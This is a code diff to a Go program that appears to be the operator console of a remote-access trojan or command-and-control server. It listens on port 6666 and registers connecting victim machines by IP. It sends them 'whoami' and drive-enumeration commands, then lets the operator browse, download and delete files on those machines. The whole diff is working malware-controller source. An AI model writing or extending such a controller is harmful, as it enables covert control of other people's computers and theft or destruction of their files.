@@ -14,7 +14,9 @@ import (
 	"time"
 )
 
-var DEBUG bool = false
+var DEBUG bool = true
+var OPENIP bool = true //是否只按照ip地址区分客户端
+var ReadOrWrite = "Read"
 var Computer = runtime.GOOS //
 var MaxConnect = 30         // 定义最大连接数量
 var MaxChanSize = 10        //默认每个命令通道的大小
@@ -27,8 +29,11 @@ type HOSTS struct {
 	Living    string
 	chansBack chan string
 	Whoami    string
+	Disk      []string
 	file      string
 }
+
+var IpChanMap = make(map[int]HOSTS, MaxConnect)
 
 func MyListen() (net.Listener, error) {
 	return net.Listen("tcp", ":6666")
@@ -64,7 +69,7 @@ func (hosts *HOSTS) SetCmd(string2 string) {
 	fmt.Printf("\n")
 	//fmt.Printf("%s", backs)
 }
-func (_ HOSTS) Listener(listener net.Listener, ipchan map[int]HOSTS) {
+func (_ HOSTS) Listener(listener net.Listener) {
 
 	for {
 
@@ -75,11 +80,14 @@ func (_ HOSTS) Listener(listener net.Listener, ipchan map[int]HOSTS) {
 		}
 		// 检测地址是否被保存过
 		// 检测该端口是否存在过，如果不存在，就标记并传入通道，反之就创建通道，记录并传入
-		ip_temp := conn.RemoteAddr().String()
-		reg := regexp.MustCompile(`\d*\.\d*\.\d*\.\d`)
-		ip := reg.FindString(ip_temp)
-		cmd := addip(ip, ipchan)
+		ip := conn.RemoteAddr().String()
+		if OPENIP {
+			reg := regexp.MustCompile(`\d*\.\d*\.\d*\.\d`)
+			ip = reg.FindString(ip)
+		}
+		_, cmd := addip(ip)
 		//_ = conn.SetReadDeadline(Time.Time{}.Add(Time.Second * 60))
+		//ipchan[i] = *cmd
 		go PutMsgs(conn, cmd) //复制传输，所以传输后conn的值改变也无妨
 		if DEBUG {
 			fmt.Printf("启动传输协程完成")
@@ -87,22 +95,20 @@ func (_ HOSTS) Listener(listener net.Listener, ipchan map[int]HOSTS) {
 
 	}
 }
-func (hosts *HOSTS) Getpoint() *HOSTS {
-	return hosts
-}
-func PutMsgs(conn net.Conn, cmd *HOSTS) {
+
+func PutMsgs(conn net.Conn, cmd int) {
 	// 用于向客户端发送请求的函数
 	regstringCmd := "\\ACmd\\r\\n"
 	regCmd := regexp.MustCompile(regstringCmd)
 	regstring := "\\ADocument"
 	reg := regexp.MustCompile(regstring)
-	go cmd.GetMsg(conn) //启动接受消息协程
+	go GetMsg(conn, cmd) //启动接受消息协程
 	if DEBUG {
 		fmt.Printf("启动接受协程完成")
 	}
 	for {
 		Sends := ""
-		Sends = <-cmd.chans
+		Sends = <-IpChanMap[cmd].chans
 		if DEBUG {
 			//fmt.Printf("PUT")
 		}
@@ -131,7 +137,9 @@ func PutMsgs(conn net.Conn, cmd *HOSTS) {
 				return
 			}
 
-			cmd.Time = time.Now().Format("01-02 15:04:05")
+			temp := IpChanMap[cmd]
+			temp.Time = time.Now().Format("01-02 15:04:05")
+			IpChanMap[cmd] = temp
 		} else if reg.FindString(Sends) == "Document" {
 			if DEBUG {
 				fmt.Printf("原文：%s\n", Sends)
@@ -159,23 +167,30 @@ func PutMsgs(conn net.Conn, cmd *HOSTS) {
 				return
 			}
 
-			cmd.Time = time.Now().Format("01-02 15:04:05")
+			temp := IpChanMap[cmd]
+			temp.Time = time.Now().Format("01-02 15:04:05")
+			IpChanMap[cmd] = temp
 
 		}
 	}
 
 }
-
-func addip(ip string, ipChanMap map[int]HOSTS) *HOSTS {
+func ReadCmd() {
+	ReadOrWrite = "Read"
+}
+func WriteCmd() {
+	ReadOrWrite = "Write"
+}
+func addip(ip string) (*HOSTS, int) {
 	var host *HOSTS
-	i := 0
-	lens := len(ipChanMap)
+	i := 1
+	lens := len(IpChanMap) + 1
 	for i < lens {
 
-		if ipChanMap[i].Ip == ip {
-			hostTme := ipChanMap[i]
+		if IpChanMap[i].Ip == ip {
+			hostTme := IpChanMap[i]
 			host = &hostTme
-			return host
+			return host, i
 		}
 		i++
 	}
@@ -184,30 +199,33 @@ func addip(ip string, ipChanMap map[int]HOSTS) *HOSTS {
 		Chans := make(chan string, MaxChanSize)
 		chansBack := make(chan string, MaxChanSize)
 		Chans <- "Cmd\r\nwhoami"
+		Chans <- "DocumentDisk\r\n"
+
 		temp_host := HOSTS{
 			ip,
 			Chans,
 			time.Now().Format("01-02 15:04:05"),
-			"60",
+			"60s",
 			chansBack,
 			"",
-			"",
+			make([]string, 1),
+			"default",
 		}
-		ipChanMap[i] = temp_host
-		hostTme := ipChanMap[i]
-		host = &hostTme
+		IpChanMap[i] = temp_host
+		//hostTme := ipChanMap[i]
+		host = &temp_host
 	}
 
-	return host
+	return host, i
 
 }
 
-func (hosts *HOSTS) PrintHost(i int) {
-	fmt.Printf("%d\t%s\t\t%s\t\t\t%s\t%s\n", i+1, hosts.Ip, hosts.Time,
+func (hosts HOSTS) PrintHost(i int) {
+	fmt.Printf("%d\t%s\t%s\t\t%s\t %s\n", i+1, hosts.Ip, hosts.Time,
 		time.Now().Format("01-02 15:04:05"), hosts.Living)
 }
 
-func (hosts *HOSTS) FileDeal() {
+func (hosts *HOSTS) FileDeal(id int) {
 	var (
 		relativePath string
 		abslsentPath = ""
@@ -220,12 +238,15 @@ func (hosts *HOSTS) FileDeal() {
 	if DEBUG {
 		fmt.Printf("DocumentDocument\r\n")
 	}
-
+	for _, j := range IpChanMap[id].Disk[1:] {
+		fmt.Printf("存在盘符%s\n", j)
+	}
 	//fmt.Printf("%s", <-hosts.chansBack)
 	if Computer == "windows" {
 		fmt.Scanf("%s", temp)
 	}
 	for {
+
 		fmt.Printf("%s>", abslsentPath)
 		_, err := fmt.Scanf("%s %s\n", &Type, &relativePath)
 		if err != nil && err.Error() != "unexpected newline" {
@@ -248,7 +269,12 @@ func (hosts *HOSTS) FileDeal() {
 					if DEBUG {
 						fmt.Printf("未找到/\n")
 					}
-					hosts.chans <- "DocumentDocument\r\n"
+					if DEBUG {
+						fmt.Printf("当前盘符容量：%d盘符len：%d\n", cap(IpChanMap[id].Disk), len(IpChanMap[id].Disk))
+					}
+					for _, j := range IpChanMap[id].Disk[1:] {
+						fmt.Printf("存在盘符%s\n", j)
+					}
 					abslsentPath = "" //默认没有/的时候就清空
 					continue
 				}
@@ -273,6 +299,8 @@ func (hosts *HOSTS) FileDeal() {
 			}
 			hosts.chans <- path
 		case "get":
+			hosts.chans <- "Documentget " + abslsentPath + relativePath
+			hosts.chansBack <- relativePath
 		case "del":
 			hosts.chans <- "Documentdel " + abslsentPath + relativePath
 		case "quit":
@@ -282,13 +310,18 @@ func (hosts *HOSTS) FileDeal() {
 			fmt.Printf("help\n")
 			//help
 		}
+		//time.Sleep(1000)
 	}
 
 }
 
-func (hosts *HOSTS) GetMsg(conn net.Conn) {
+func GetMsg(conn net.Conn, hosts int) {
 	regstring := "\\ADocument\\r\\n"
+	regAlive := "\\AAlive\\r\\n"
+	regDiskString := "\\ADisk\\r\\n"
+	regA := regexp.MustCompile(regAlive)
 	reg := regexp.MustCompile(regstring)
+	regDisk := regexp.MustCompile(regDiskString)
 	GetMsg := make([]byte, MaxMagString*4)
 	n, err := conn.Read(GetMsg)
 	if err != nil {
@@ -301,9 +334,14 @@ func (hosts *HOSTS) GetMsg(conn net.Conn) {
 		fmt.Printf("打印接受的whoami：%s\n", string(GetMsg[:n]))
 	}
 	// 解码位置
-	hosts.Whoami, _ = cobalt_crypto.Decode(GetMsg[:n])
+	temp1, _ := cobalt_crypto.DecodeToString(GetMsg[:n])
+	strings.Replace(temp1, "\\n", "", -1)
+	host1 := IpChanMap[hosts]
+	host1.Whoami = temp1
+	IpChanMap[hosts] = host1
+	//hosts.chansBack <- hosts.Whoami
 	if DEBUG {
-		fmt.Printf("打印赋值的whoami: %s\n", hosts.Whoami)
+		fmt.Printf("打印赋值的whoami: %s\n", IpChanMap[hosts].Whoami)
 	}
 	if DEBUG {
 		fmt.Printf("whoami: %s\n", GetMsg)
@@ -317,7 +355,7 @@ func (hosts *HOSTS) GetMsg(conn net.Conn) {
 			return
 		}
 		//b, err2 := SocketToUtf8(GetMsg[:n1])
-		b, err2 := cobalt_crypto.Decode(GetMsg[:n1]) // 解码位置
+		b, err2 := cobalt_crypto.DecodeToString(GetMsg[:n1]) // 解码位置
 		//b := string(GetMsg[:n1])
 		//var err2 error = nil
 		if err2 != nil {
@@ -325,33 +363,87 @@ func (hosts *HOSTS) GetMsg(conn net.Conn) {
 			log.Println(err2)
 		}
 
-		if b == "Alive" {
+		if regA.FindString(b) == "Alive\r\n" {
 			if DEBUG {
-				fmt.Printf("收到心跳包")
+				//fmt.Printf("收到心跳包")
 			}
-			hosts.Time = time.Now().Format("01-02 15:04:05")
+			temp := IpChanMap[hosts]
+			temp.Time = time.Now().Format("01-02 15:04:05")
+			IpChanMap[hosts] = temp
 		} else if reg.FindString(b) == "Document\r\n" {
-			file := b[10:]
+			file := b[10:n1]
 			//data, _ := ioutil.ReadAll(transform.NewReader(bytes.NewReader([]byte(file)), simplifiedchinese.GBK.NewEncoder()))
-			ioutil.WriteFile(hosts.file, []byte(file), 0664)
+
+			filename := <-IpChanMap[hosts].chansBack
+
+			if filename == "" {
+				filename = IpChanMap[hosts].file
+			}
+			if DEBUG {
+				fmt.Printf("当前文件名称：%s", filename)
+			}
+			ioutil.WriteFile(filename, []byte(file), 0664)
 			fmt.Printf("\n文件保存完成\n")
-			hosts.Time = time.Now().Format("01-02 15:04:05")
+			temp := IpChanMap[hosts]
+			temp.Time = time.Now().Format("01-02 15:04:05")
+			IpChanMap[hosts] = temp
+		} else if regDisk.FindString(b) == "Disk\r\n" {
+			var disknum int
+			b = strings.Replace(b, "\r\n", " ", -1)
+			if DEBUG {
+				fmt.Printf("替换后：%s\n", b)
+			}
+			n, _ := fmt.Sscanf(b, "Disk %d\n", &disknum)
+			if n != 1 {
+				fmt.Printf("Disk接收失败")
+				if DEBUG {
+					fmt.Printf("n = %d\n", n)
+				}
+				log.Println(err)
+			}
+			temp := IpChanMap[hosts] //确保只增加1次
+			capt := cap(temp.Disk) == 1
+			for i := 1; i <= 10; i++ {
+				if ((disknum >> i) & 1) == 1 {
+					if DEBUG {
+						fmt.Printf("当前盘符cap ：%d 盘符len：%d", cap(temp.Disk), len(temp.Disk))
+					}
+					if capt {
+						if DEBUG {
+							fmt.Printf("成功编辑盘符\n")
+						}
+						temp.Disk = append(temp.Disk, string(65+i))
+					}
+					if DEBUG {
+						fmt.Printf("GET_存在盘符%s:\n", string(65+i))
+					}
+
+				}
+			}
+			temp.Time = time.Now().Format("01-02 15:04:05")
+			IpChanMap[hosts] = temp
+
 		} else {
 			if DEBUG {
 				fmt.Printf("收到消息\n")
 			}
 
 			fmt.Printf("%s", b)
-
+			if DEBUG {
+				fmt.Printf("当前心跳：%s\n", IpChanMap[hosts].Time)
+			}
 			fmt.Printf("\n")
 			if DEBUG {
 				//fmt.Printf("data 打印完毕")
 			}
-			hosts.Time = time.Now().Format("01-02 15:04:05")
+			temp := IpChanMap[hosts]
+			temp.Time = time.Now().Format("01-02 15:04:05")
+			IpChanMap[hosts] = temp
 		}
 
 	}
 }
+
 func (hosts *HOSTS) Fileput() {
 	fmt.Printf("fileput")
 }
